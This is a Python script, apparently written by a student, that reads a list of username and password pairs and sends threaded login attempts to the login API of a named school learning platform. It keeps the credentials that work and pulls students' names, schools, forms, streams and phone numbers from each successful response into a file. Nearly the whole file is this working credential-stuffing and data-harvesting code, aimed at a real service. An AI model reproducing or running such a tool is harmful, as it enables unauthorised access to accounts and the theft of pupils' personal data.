import json
import threading
import requests
from bs4 import BeautifulSoup

threadsFinished = 0  # number of threads done
config = open('config.txt')  # open credential file
credentials = json.load(open('credentials.txt','r'))  # deserialize file
noOfThreads = len(credentials)  # no of threads to be created for the credentials
loginPage = 'https://apilearning.zeraki.app/api/v1/login'  # zeraki login page url
minePage = ''  # mine page url
validCredentials = {}
minedData = list()

def banner():
    text = '''
    ######################################################
    ######TH3_Z3R4K1_M1N3#################################
    ######################################################
    CREATED BY RAMMY SIFA A STUDENT IN KANGA SCHOOL     
    TO SHOW THAT KANGA SCHOOL IS UNDISPUTEDLY THE BEST
    SCHOOL. BY USING THIS TOOL U ARE ACCEPTING THESE 
    TERMS AND CONDITIONS.GOD BLESS KANGA SCHOOL.
    I WOULD ALSO WANT TO THANK HOSTILEINFILTRATOR FOR ALL
    THE SUPPORT AND HELP HE HAS GIVEN
    MAY THE HACKER CULTURE GROW.
    INSTAGRAM : rammy sifa
    ######################################################
    ######################################################
    ######################################################
    '''
    print(text)
# HANDLING THE CREDENTIALS
# for each credential :
# 1.login to zeraki
# assert if credential is valid .(Data mining to do text analysis)
# if valid save the valid credentials in a new dictionary
# else ignore
# increase count then exit
# END OF THREAD\
# final data
#[
 #   {school,name,phoneNumber,form,stream}
# ]
#
#
#
def miner(response):
    try:
        phoneNumer = response.json()['user']['user']['phoneNumber']
    except:
        phoneNumer = 'not available'
    school = response.json()['user']['user']['currentSchool']['name']
    name = response.json()['user']['user']['name']
    stream = response.json()['user']['user']['studentProfile']['streamName']
    form = response.json()['user']['user']['form']
    print(f"FOUND:{name} from {school} is in form {form} and his/her stream is {stream} his/her closest contact is {phoneNumer}")
    minedData.append({'school':school,'name':name,'phoneNumber':phoneNumer,'form':form,'stream':stream})

def isLoggedIn(response):
    if response.status_code == 200 :
        return True
    else:
        return False

def handleCredential(username, password):
    global noOfThreads
    global threadsFinished

    payload = {
        'username':username,
        'password':password
    }
    response = requests.post(loginPage, data=json.dumps(payload),headers={'content-type':'application/json'})
    if isLoggedIn(response):
        validCredentials[username] = [username, password]
        miner(response)
    threadsFinished += 1
    print(f'credentials finnished :{threadsFinished}/{noOfThreads}')

banner()
# iterate through the dictionary creating threads to handle the credentials
for user in credentials:
    username = credentials[user][0]
    password = credentials[user][1]
    threading.Thread(target=handleCredential, args=(username, password,)).start()
# when threads finished reaches number of threads exit
while threadsFinished != noOfThreads:
    pass
print ('Done fetching')
json.dump(minedData,open('mine.txt','w+'))